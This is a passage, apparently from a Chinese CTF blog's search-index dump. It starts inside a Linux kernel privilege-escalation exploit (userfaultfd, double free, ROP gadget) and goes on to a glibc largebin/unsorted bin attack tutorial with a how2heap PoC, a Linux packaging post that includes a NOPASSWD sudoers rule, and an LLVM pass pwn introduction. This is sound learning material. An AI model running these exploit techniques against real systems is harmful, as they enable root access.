((seq_fd_reserve[i] = open(&quot;/proc/self/stat&quot;, O_RDONLY)) &lt; 0)            ErrExit(&quot;seq reserve!&quot;);    &#125;    leak_buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);    RegisterUserfault(leak_buf, 0x1000, leak_handler);    shm_id = shmget(114514, 0x1000, SHM_R | SHM_W | IPC_CREAT);    if (shm_id &lt; 0)        ErrExit(&quot;shmget!&quot;);    shm_addr = shmat(shm_id, NULL, 0);    if (shm_addr &lt; 0)        ErrExit(&quot;shmat!&quot;);    if (shmdt(shm_addr) &lt; 0)        ErrExit(&quot;shmdt!&quot;);    create(leak_buf);    printf(&quot;[*]kernel_base=&gt;%p\\n&quot;, kernel_base);    printf(&quot;[*]kernel_offset=&gt;%p\\n&quot;, kernel_offset);    double_free_buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);    RegisterUserfault(double_free_buf, 0x1000, double_free_handler);    create(&quot;196082&quot;);    delete (double_free_buf);    printf(&quot;[*] double free\\n&quot;);    getroot_buf = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);    RegisterUserfault(getroot_buf + 0x1000, 0x1000, getroot_handler);    *(unsigned long *)(getroot_buf + 0x1000 - 8) = 0xffffffff814d51c0 + kernel_offset;    // // add rsp , 0x1c8 ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15; pop rbp ; ret    printf(&quot;gadget=&gt;%p\\n&quot;, *(unsigned long *)(getroot_buf + 0x1000 - 8));    seq_fd = open(&quot;/proc/self/stat&quot;, O_RDONLY);    setxattr(&quot;/exp&quot;, &quot;196082&quot;, getroot_buf + 0x1000 - 8, 32, 0);    return 0;&#125;\n\n\n题目放在：https://github.com/196082/196082/tree/main/kernel_pwn\n\n参考链接：https://www.anquanke.com/post/id/266898#h3-5\n","categories":["Linux Kernel"],"tags":["userfaultfd","setxattr","pt_regs"]},{"title":"largebin attack","url":"/2022/02/23/largebin-attack/","content":"关于largebin的原理这里就只给一张图吧，也是在网上找的(我懒得画)。\n\nlargebin一直是容易被忽略的利用方式(可能只是我这样吧)，在此之前我一直觉得largebin不会出现直到最近的比赛怎么全是这玩意，所以又下来学习了一遍。\nGlibc2.23到Glibc2.27下的largebin attack其实Glibc2.27和Glibc2.23的利用方式都差不多，只不过在2.27里增加了tcache机制，所以想实现largebin attack要么占满tcache，或则大于tcache范围。\n下面源码是当unsorted bin 当作的chunk进入large bin的过程\nvictim_index = largebin_index (size);bck = bin_at (av, victim_index); fwd = bck-&gt;fd;/* maintain large bins in sorted order */if (fwd != bck)&#123;    /* Or with inuse bit to speed comparisons */    size |= PREV_INUSE;    /* if smaller than smallest, bypass loop below */    assert (chunk_main_arena (bck-&gt;bk));    if ((unsigned long) (size)                       &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))    &#123;        fwd = bck;        bck = bck-&gt;bk;        victim-&gt;fd_nextsize = fwd-&gt;fd;        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;         fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;    &#125;    else     &#123;        assert (chunk_main_arena (fwd));        while ((unsigned long) size &lt; chunksize_nomask (fwd))         &#123;            fwd = fwd-&gt;fd_nextsize;            assert (chunk_main_arena (fwd));        &#125;        if ((unsigned long) size            == (unsigned long) chunksize_nomask (fwd))            /* Always insert in the second position.  */            fwd = fwd-&gt;fd;         else        &#123;            victim-&gt;fd_nextsize = fwd;            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;            fwd-&gt;bk_nextsize = victim;            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;        &#125;        bck = fwd-&gt;bk;    &#125;&#125;else    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;&#125;mark_bin (av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim;\n\n这里的第二个if判断的就是size如果小于最小的size的时候发生的事情，但是那里的内容相较于下面不是很好利用。所以直接看下面。\n    if ((unsigned long) size        == (unsigned long) chunksize_nomask (fwd))        /* Always insert in the second position.  */        fwd = fwd-&gt;fd;     else    &#123;        victim-&gt;fd_nextsize = fwd;        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;        fwd-&gt;bk_nextsize = victim;        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;    &#125;    bck = fwd-&gt;bk;    &#125;    else        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;    &#125;mark_bin (av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim;\n\n这里就是我们主要的利用代码，这里的if判断的是找到相同size的chunk发生什么，但是我们真正利用的代码其实是else里面的。现在假设我们存在一个已经在large bin的chunk1：\nsize = 0x450;&#123;    fd = 0;    bk = 0;    fd_nextsize = 0;    bk_nextsize = target-0x20;&#125;\n\n和一个在unsorted bin当中的chunk2：\nsize = 0x460;&#123;    fd = 0;    bk = 0;    fd_nextsize = 0;    bk_nextsize = 0;&#125;\n\n当我们下一次malloc一个size大于0x460的chunk时那么chunk2就会进入large bin，此时就会执行以下代码：\nvictim-&gt;fd_nextsize = fwd;victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;fwd-&gt;bk_nextsize = victim;victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;\n\n翻译过来就是：\nchunk2-&gt;fd_nextsize = chunk1;chunk2-&gt;bk_nextsize = chunk1-&gt;bk_nextsize; // chunk1-&gt;bk_nextsize = target-0x20// 这一步过后，chunk2-&gt;bk_next_size也就变成了target-0x20chunk1-&gt;bk_nextsize = chunk2;chunk2-&gt;bk_nextsize-&gt;fd_nextsize = chunk2;// 所以这一步最终的形式其实是*(target-0x20)-&gt;fd_nextsize = chunk2;\n\nvictim这样就在target位置写上了chunk2的地址。\n另外在这里还存在另一个可以任意地址写入堆地址的地方：\n此时chunk1变为:\nsize = 0x450;&#123;    fd = 0;    bk = target-0x10;    fd_nextsize = 0;    bk_nextsize = 0;&#125;\n\n\n\n// bck = fwd-&gt;bk;   上面执行完之后有这样一句victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim;\n\n翻译过来也就是：\nchunk2-&gt;bk = target-0x10;chunk2-&gt;fd = chunk1;chunk1-&gt;bk = chunk2;*(target-0x10)-&gt;fd = chunk2;\n\n也就是如果同时修改了bk和bk_nextsize的话可以同时修改两处地址的值为堆地址。\nGlibc2.29下的largebin attack这里的攻击方式和上面的很类似，首先看一下源码：\n    \tvictim_index = largebin_index (size);       bck = bin_at (av, victim_index);      fwd = bck-&gt;fd;      /* maintain large bins in sorted order */      if (fwd != bck)        &#123;          /* Or with inuse bit to speed comparisons */          size |= PREV_INUSE;          /* if smaller than smallest, bypass loop below */          assert (chunk_main_arena (bck-&gt;bk));          if ((unsigned long) (size)  &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))            &#123;              fwd = bck;              bck = bck-&gt;bk;              victim-&gt;fd_nextsize = fwd-&gt;fd;              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;               fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;            &#125;          else            &#123;              assert (chunk_main_arena (fwd));              while ((unsigned long) size &lt; chunksize_nomask (fwd))                &#123;                  fwd = fwd-&gt;fd_nextsize;assert (chunk_main_arena (fwd));                &#125;              // but size must be different              if ((unsigned long) size== (unsigned long) chunksize_nomask (fwd))                /* Always insert in the second position.  */                fwd = fwd-&gt;fd;              else                &#123;                  victim-&gt;fd_nextsize = fwd;                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;                  fwd-&gt;bk_nextsize = victim;                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                 &#125;              bck = fwd-&gt;bk;            &#125;        &#125;      else        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;\n\n其实很明显的可以看出来下面仍然存在相应的漏洞\nvictim-&gt;fd_nextsize = fwd;victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;fwd-&gt;bk_nextsize = victim;victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; \n\nunsorted bin attack在这里说一下unsorted bin attack，虽然在2.29出来之后基本就没法利用了但是害怕题目出的libc版本在以往的版本然后又限制大小所以这里还是提一下unsorted bin attack\n这里就不提出全部源码就把存在漏洞的两行提出来：\nunsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av);\n\n可以看出来如果我们可以控制unsorted_chunks (av)的bk指针，那就可以向任意地址写入堆地址了。\n这里直接给出how2heap当中的poc吧：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    printf(&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stackn&quot;);    printf(&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;           &quot;global variable global_max_fast in libc for further fastbin attacknn&quot;);    unsigned long stack_var=0;    printf(&quot;Let&#x27;s first look at the target we want to rewrite on stack:n&quot;);    printf(&quot;%p: %ldnn&quot;, &amp;stack_var, stack_var);    unsigned long *p=malloc(400);    printf(&quot;Now, we allocate first normal chunk on the heap at: %pn&quot;,p);    printf(&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;           &quot;the first one during the free()nn&quot;);    malloc(500);    free(p);    printf(&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;           &quot;point to %pn&quot;,(void*)p[1]);    //------------VULNERABILITY-----------    p[1]=(unsigned long)(&amp;stack_var-2);    printf(&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointern&quot;);    printf(&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%pnn&quot;,(void*)p[1]);    //------------------------------------    malloc(400);    printf(&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, target should has already been &quot;           &quot;rewrite:n&quot;);    printf(&quot;%p: %pn&quot;, &amp;stack_var, (void*)stack_var);&#125;\n\n写的很详细，如果看不懂可以-g编译调试一下。\nGlibc2.31下的largebin attack先看一下源码：\nif (fwd != bck)&#123;    /* Or with inuse bit to speed comparisons */    size |= PREV_INUSE;    /* if smaller than smallest, bypass loop below */    assert (chunk_main_arena (bck-&gt;bk));    if ((unsigned long) (size)        &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))    &#123;        fwd = bck;        bck = bck-&gt;bk;        victim-&gt;fd_nextsize = fwd-&gt;fd;        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;    &#125;    else    &#123;        assert (chunk_main_arena (fwd));        while ((unsigned long) size &lt; chunksize_nomask (fwd))        &#123;            fwd = fwd-&gt;fd_nextsize;            assert (chunk_main_arena (fwd));        &#125;        if ((unsigned long) size            == (unsigned long) chunksize_nomask (fwd))            /* Always insert in the second position.  */            fwd = fwd-&gt;fd;        else        &#123;            victim-&gt;fd_nextsize = fwd;            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;            if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))                malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);            fwd-&gt;bk_nextsize = victim;            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;        &#125;        bck = fwd-&gt;bk;        if (bck-&gt;fd != fwd)            malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);    &#125;&#125;else    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;&#125;\n\n这里可以看到西面我们以前利用的地方都加上了检查，导致我们没法再从这个地方出发利用了，但是上面是没有任何保护的。\nif ((unsigned long) (size)    &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;    fwd = bck;    bck = bck-&gt;bk;    victim-&gt;fd_nextsize = fwd-&gt;fd;    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;&#125;\n\n其实根据上面几个版本的glibc来看这里的利用思路其实是挺明显的，我们只需要修改fwd-&gt;fd-&gt;bk_nextsize也能实现上面的操作。\n比如，现在存在一个已经在large bin 当中的chunk1：\nsize = 0x460&#123;    fd = largebin(index); // 其实在最上面的图能够看出来这里其实保存的是largebin当中相应的位置    bk = largebin(index);    fd_nextsize = 0;    bk_nextsize = target-0x20;&#125;\n\n还有一个即将放入large bin当中的chunk2：\nsize = 0x450&#123;    fd = 0;    bk = 0;    fd_nextsize = 0;    bk_nextsize = 0;&#125;\n\n可以看到将上面的翻译下来其实就是\nchunk2-&gt;fd_nextsize = largebin(index);chunk2-&gt;bk_nextsize = largebin(index)-&gt;bk_nextsize;// 这里的largebin一定存放的是chunk1所以后面的表达式等价于chunk1-&gt;bk_nextsize也就是target-0x20*(target-0x20)-&gt;fd_nextsize = chunk2;// 前面的那个不需要管\n\n这样也就同样实现了任意地址写上堆地址。\n任意地址写上堆地址的利用方式很多，比如VN那道题为FSOP做铺垫，或则修改global_max_fast的值到一个很大的值，为fastbin attack做铺垫，一般来说这种攻击手法都是为其他的攻击手法做铺垫的。\n\n参考链接：\nhttps://www.anquanke.com/post/id/244018\n","categories":["pwn"],"tags":["largebin attack"]},{"title":"linux软件安装时到底在做什么?","url":"/2022/04/07/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E6%97%B6%E5%88%B0%E5%BA%95%E5%9C%A8%E5%81%9A%E4%BB%80%E4%B9%88/","content":"除了CTF外我其实还是一个特别喜欢搞linux的一个垃圾，在2020年11月份左右我将电脑系统换到了kali并且因为当时不会装双系统把windows搞没了，不过用过一段时间发现linux的操作逻辑更加的符合我。\n依赖linux的依赖问题一直是被人诟病的，尤其是debian系的(arch系我感觉几乎没遇到过依赖问题)，在进行安装的总是会出来这个套那个，导致我以前使用ubuntu时安装一个程序可能得花上一下午的时间，而且几乎全部时间都在解决依赖问题。\n那么问题来了，依赖到底是什么？\n首先需要说明的是windows和linux其实都是存在依赖问题的，比如我以前在windows虚拟机里面运行ida的时候就会出现依赖问题，不过网上都有现成的包直接安装就好。虽然按理来说linux也存在依赖的包，但是为什么linux的依赖问题会比windows更加经常发生呢？\n举个例子：现在运行一个程序需要依赖a-1，我使用windows找到了这个依赖的安装包，实际上这个安装包安装下来的是a-1,a-2,,,,a-30。但是纯纯的linux只会帮你安装a-1，下一次遇到需要a-12的时候，windows不会报错但是linux又需要安装另外版本的依赖了。\n上面的看过了之后就大概对linux的依赖问题有一定了解了，那么为了更好的了解依赖问题我们首先需要知道\n安装一个包的过程\n首先可以看到linux和window的不同，linux的安装包是真的非常单纯的压缩整合到一起，最后由包管理器将不同功能的文件放到不同目录。\n在上面这张图里面我们需要重点关注的data.tar.xz\n\n查看其内部可以发现就是一个usr目录\n\n这里就是我们熟悉的desktop，也就是桌面图标\n\n可以看到bin目录是一个链接符号\ntcdy@archlinux /mnt/5F2601400CC8834D/save/usr/bin % ls -l typora lrwxrwxrwx 1 root root 22 Apr  7 10:51 typora -&gt; ../share/typora/Typora\n\n可以看到就是链接到了一个可执行文件，当我们双击文件就可以打开typora了。\n找到可执行程序之后只需要使用ldd即可查看需要的依赖\ntcdy@archlinux ..5F2601400CC8834D/save/usr/share/typora % ldd Typora \tlinux-vdso.so.1 (0x00007ffe581fd000)\tlibffmpeg.so =&gt; /mnt/5F2601400CC8834D/save/usr/share/typora/./libffmpeg.so (0x00007fefa6baa000)\tlibdl.so.2 =&gt; /usr/lib/libdl.so.2 (0x00007fefa6b7e000)\tlibpthread.so.0 =&gt; /usr/lib/libpthread.so.0 (0x00007fefa6b79000)\tlibgobject-2.0.so.0 =&gt; /usr/lib/libgobject-2.0.so.0 (0x00007fefa6b1a000)\tlibglib-2.0.so.0 =&gt; /usr/lib/libglib-2.0.so.0 (0x00007fefa69dc000)\tlibxshmfence.so.1 =&gt; /usr/lib/libxshmfence.so.1 (0x00007fefa69d7000)\tlibgio-2.0.so.0 =&gt; /usr/lib/libgio-2.0.so.0 (0x00007fefa6807000)\tlibnss3.so =&gt; /usr/lib/libnss3.so (0x00007fefa66d4000)\tlibnssutil3.so =&gt; /usr/lib/libnssutil3.so (0x00007fefa66a1000)\tlibsmime3.so =&gt; /usr/lib/libsmime3.so (0x00007fefa6678000)\tlibnspr4.so =&gt; /usr/lib/libnspr4.so (0x00007fefa6636000)\tlibatk-1.0.so.0 =&gt; /usr/lib/libatk-1.0.so.0 (0x00007fefa660c000)\tlibatk-bridge-2.0.so.0 =&gt; /usr/lib/libatk-bridge-2.0.so.0 (0x00007fefa65d4000)\tlibdbus-1.so.3 =&gt; /usr/lib/libdbus-1.so.3 (0x00007fefa6581000)\t......\n\n可以看到这里甚至于有依赖就在当前目录寻找了\n\n可以看到这里的文件其实也就包含了上面所需要的一部分依赖，其实这也是很多windows程序的思路，如果程序存在很多不常见到的依赖就会把依赖和程序捆绑起来进行安装。\n其实到这里大家都大概知道了包管理器在安装程序时到底是干了什么，其实就是将不同功能的程序放进了不同目录。\nAUR-PKGBUILD的编写一样拿typora举例\n# Maintainer: Jonas Bögle &lt;aur@iwr.sh&gt;# Contributor: Jonathan Duck &lt;duckbrain30@gmail.com&gt;_pkgname=typorapkgname=&quot;$_pkgname-free&quot;pkgver=0.11.18pkgrel=2pkgdesc=&quot;A minimal markdown editor and reader.&quot;arch=(&#x27;x86_64&#x27;)filename=&quot;typora_$&#123;pkgver&#125;_amd64.deb&quot;license=(&#x27;custom:&quot;Copyright (c) 2015 Abner Lee All Rights Reserved.&quot;&#x27;)url=&quot;https://typora.io/&quot;depends=(&#x27;gtk3&#x27; &#x27;libxss&#x27;)optdepends=(\t&#x27;noto-fonts-emoji: Or some other emoji font to see emojis&#x27;\t&#x27;pandoc: Import/export for extra file formats&#x27;)provides=(&quot;$_pkgname&quot;)conflicts=(&quot;$_pkgname&quot;)source=(&quot;https://typora.io/linux/$filename&quot;)sha512sums=(&#x27;8933cb4eab13a37719a3771d14a7a3f5951f6bbce06381ffe37ad5bc3029efed3878723427a4e97b83dbc1d7ccc43b31551b0c336663c843f0e685f8a4e2390e&#x27;)package() &#123;\tbsdtar -xf data.tar.xz -C &quot;$pkgdir/&quot;\trm -rf &quot;$pkgdir/usr/share/lintian/&quot;\tchmod 4755 &quot;$pkgdir/usr/share/typora/chrome-sandbox&quot;\t# Remove write permission for group/other\tchmod -R go-w &quot;$pkgdir/usr/share/typora/resources/node_modules&quot;\tsed -i &#x27;/Change Log/d&#x27; &quot;$pkgdir/usr/share/applications/typora.desktop&quot;\tfind &quot;$pkgdir&quot; -type d -exec chmod 755 &#123;&#125; \\;&#125;\n\n上面的名字，版本，架构什么就不说了，主要关注下面的内容。\n首先是这里source，很明显就是再往上的这个文件的deb包，下面sha512sums就是检验码。\nsrcdir\n​    makepkg将会把源文件解压到此文件夹或在此文件夹中生成指向 PKGBUILD 里 source 数组中文件的软连接。\npkgdir\n​    makepkg会把该文件夹当成系统根目录，并将软件安装在此文件夹下。\n重点就是下面的打包函数，可以看到首先是解压了data.tar.xz这个包带pkgdir。后面就是删除个东西，然后改变权限(可以看到typora是Electron)，下面就是创建图标，最后就是修改pkgdir下目录的权限为755。\n关于aur的更多可以看archwiki\nsudo免密码这个是我每次装完系统必干的一件事情，不过经常忘，而且网上的很多东西都不能实现。所以这里自己记录一下\nroot ALL=(ALL:ALL) ALLyour_username ALL=(ALL) NOPASSWD: ALL\n\n删除/etc/sudoers.d/10-installer\n总结其实程序的安装并没有我以前想象的那么复杂，至少对于linux来说是这样的。如果遇到什么有趣的linux操作我也会及时分享。\n","categories":["搞机"],"tags":["deb","aur"]},{"title":"llvm pass pwn","url":"/2022/07/27/llvm-pass-pwn/","content":"简要介绍首先呢，也是同其他博主一样，copy一下百度对于llvm的介绍：\nLLVM是构架编译器的框架系统，以C++编写而成，用于优化以任意程序语言编写的程序的编译时间、链接时间、运行时间以及空闲时间，对开发者保持开放，并兼容已有脚本。\nLLVM PASS是什么：pass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化等功能。pass的执行就是编译器对编译对象进行转换、分析和优化的过程，pass构建了这些过程所需要的分析结果\n\n首先我们的源代码会被clang编译器编译成一种中间代码——IR，它连接这编译器的前端和后端，IR的设计很大程度体现着LLVM插件化、模块化的设计哲学，LLVM的各种pass其实都是作用在LLVM IR上的。同时IR也是一个编译器组件接口。通常情况下，设计一门新的编程语言只需要完成能够生成LLVM IR的编译器前端即可，然后就可以轻松使用LLVM的各种编译优化、JIT支持、目标代码生成等功能。\nLLVM IRLLVM的IR的三种存在形式：\n\n内存格式，只保存在内存中，人无法看到\n不可读的IR，被称作bitcode，文件后缀为bc\n可读的IR，介于高级语言和汇编代码之间，文件后缀为ll\n\n大概就是说，LLVM提供了一种中间语言形式，以及编译链接这种语言的后端能力，那么对于一个新语言，只要开发者能够实现新语言到IR的编译器前端设计，就可以享受到从IR到可执行文件这之间的LLVM提供的所有优化、分析或者代码插桩的能力。而LLVM PASS就是去处理IR文件，通过opt利用写好的so库优化已有的IR，形成新的IR。而LLVM PASS类的pwn就是利用这一过程中可能会出现的漏洞。\n从对应格式转化到另一格式的命令：\n.c  =&gt; .ll: clang -emit-llvm -S a.c -o a.ll.c  =&gt; .bc: clang -emit-llvm -c a.c -o a.bc.ll =&gt; .bc: llvm-as a.ll -o a.bc.bc =&gt; .ll: llvm-dis a.bc -o a.ll.bc =&gt; .s : llc a.bc -o a.s\n\n首先呢，写一个简单的c语言程序：\n#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() &#123;   char name[0x10];   read(0,name,0x10);   write(1,name,0x10);   printf(&quot;wow\\n&quot;);&#125;\n\n通过上面所给的指令\nclang -emit-llvm -S test.c -o test.ll\n\n获得如下内容：\n; ModuleID = &#x27;test.c&#x27;target datalayout = &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;target triple = &quot;x86_64-pc-linux-gnu&quot;@.str = private unnamed_addr constant [5 x i8] c&quot;wow\\0A\\00&quot;, align 1; Function Attrs: nounwind uwtabledefine i32 @main() #0 &#123;  %name = alloca [16 x i8], align 16  %1 = getelementptr inbounds [16 x i8], [16 x i8]* %name, i32 0, i32 0  %2 = call i64 @read(i32 0, i8* %1, i64 16)  %3 = getelementptr inbounds [16 x i8], [16 x i8]* %name, i32 0, i32 0  %4 = call i64 @write(i32 1, i8* %3, i64 16)  %5 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0))  ret i32 0&#125;declare i64 @read(i32, i8*, i64) #1declare i64 @write(i32, i8*, i64) #1declare i32 @printf(i8*, ...) #1attributes #0 = &#123; nounwind uwtable &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;attributes #1 = &#123; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;!llvm.ident = !&#123;!0&#125;!0 = !&#123;!&quot;clang version 3.8.0-2ubuntu4 (tags/RELEASE_380/final)&quot;&#125;\n\n可以看见中间无论是申请变量还是调用函数还是可以很清晰的看出来的。\nLLVM PASS官方文档的一个实例：\n#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;using namespace llvm;namespace &#123;  struct Hello : public FunctionPass &#123;    static char ID;    Hello() : FunctionPass(ID) &#123;&#125;    bool runOnFunction(Function &amp;F) override &#123;      errs() &lt;&lt; &quot;Hello: &quot;;      errs().write_escaped(F.getName()) &lt;&lt; &#x27;\\n&#x27;;      return false;    &#125;  &#125;;&#125;char Hello::ID = 0;// Register for optstatic RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello World Pass&quot;);// Register for clangstatic RegisterStandardPasses Y(PassManagerBuilder::EP_EarlyAsPossible,  [](const PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;    PM.add(new Hello());  &#125;);\n\n该示例用于遍历IR中的函数，因此结构体Hello继承了FunctionPass，并重写了runOnFunction函数，那么每遍历到一个函数时，runOnFunction都会被调用，因此该程序会输出函数名。我们需要将其编译为模块\nclang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared test.cpp -o test.so `llvm-config --ldflags`\n\ntcdy@ubuntu:~$ opt -load ./test.so -hello ./test.llWARNING: You&#x27;re attempting to print out a bitcode file.This is inadvisable as it may cause display problems. Ifyou REALLY want to taste LLVM bitcode first-hand, youcan force output with the `-f&#x27; option.Hello: main\n\n上面以我们刚刚的IR为例，-hellow是注册的名字\nstatic RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello World Pass&quot;);\n\n最后打印出来函数名字\n#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;using namespace llvm;namespace &#123;  struct Hello : public FunctionPass &#123;    static char ID;    Hello() : FunctionPass(ID) &#123;&#125;    bool runOnFunction(Function &amp;F) override &#123;      errs() &lt;&lt; &quot;Hello: &quot;;      errs().write_escaped(F.getName()) &lt;&lt; &#x27;\\n&#x27;;      SymbolTableList&lt;BasicBlock&gt;::const_iterator bbEnd = F.end();      for(SymbolTableList&lt;BasicBlock&gt;::const_iterator bbIter=F.begin(); bbIter!=bbEnd; ++bbIter)&#123;         SymbolTableList&lt;Instruction&gt;::const_iterator instIter = bbIter-&gt;begin();         SymbolTableList&lt;Instruction&gt;::const_iterator instEnd  = bbIter-&gt;end();         for(; instIter != instEnd; ++instIter)&#123;            errs() &lt;&lt; &quot;opcode=&quot; &lt;&lt; instIter-&gt;getOpcodeName() &lt;&lt; &quot; NumOperands=&quot; &lt;&lt; instIter-&gt;getNumOperands() &lt;&lt; &quot;\\n&quot;;         &#125;      &#125;      return false;    &#125;  &#125;;&#125;char Hello::ID = 0;// Register for optstatic RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello World Pass&quot;);// Register for clangstatic RegisterStandardPasses Y(PassManagerBuilder::EP_EarlyAsPossible,  [](const PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;    PM.add(new Hello());&#125;);\n\n现在在刚刚的基础上对函数的代码进行遍历操作\ntcdy@ubuntu:~$ opt -load ./test.so -hello ./test.llWARNING: You&#x27;re attempting to print out a bitcode file.This is inadvisable as it may cause display problems. Ifyou REALLY want to taste LLVM bitcode first-hand, youcan force output with the `-f&#x27; option.Hello: mainopcode=alloca NumOperands=1opcode=getelementptr NumOperands=3opcode=call NumOperands=4opcode=getelementptr NumOperands=3opcode=call NumOperands=4opcode=call NumOperands=2opcode=ret NumOperands=1\n\n最后可以看到拿到了函数中的指令操作\nLLVM PASS逆向分析一般来说LLVM PASS pwn都是对函数进行PASS操作，所以我们首先要找到runOnFunction函数时如何重写的\n\n一般来说runOnFunction都会在函数表的最下面\n2021 redhat simpleVM首先找到上面所述的函数：\n__int64 __fastcall sub_6830(__int64 a1, llvm::Value *a2)&#123;  __int64 v2; // rdx  bool v4; // [rsp+7h] [rbp-119h]  size_t v5; // [rsp+10h] [rbp-110h]  const void *Name; // [rsp+28h] [rbp-F8h]  __int64 v7; // [rsp+30h] [rbp-F0h]  int v8; // [rsp+94h] [rbp-8Ch]  Name = (const void *)llvm::Value::getName(a2);  v7 = v2;  if ( &quot;o0o0o0o0&quot; )    v5 = strlen(&quot;o0o0o0o0&quot;);  else    v5 = 0LL;  v4 = 0;  if ( v7 == v5 )  &#123;    if ( v5 )      v8 = memcmp(Name, &quot;o0o0o0o0&quot;, v5);    else      v8 = 0;    v4 = v8 == 0;  &#125;  if ( v4 )    sub_6AC0(a1, a2);  return 0LL;&#125;\n\n可以看到这里验证的是函数名是否为o0o0o0o0然后进入：\nunsigned __int64 __fastcall sub_6AC0(__int64 a1, llvm::Function *a2)&#123;  llvm::BasicBlock *v3; // [rsp+20h] [rbp-30h]  __int64 v4; // [rsp+38h] [rbp-18h] BYREF  __int64 v5[2]; // [rsp+40h] [rbp-10h] BYREF  v5[1] = __readfsqword(0x28u);  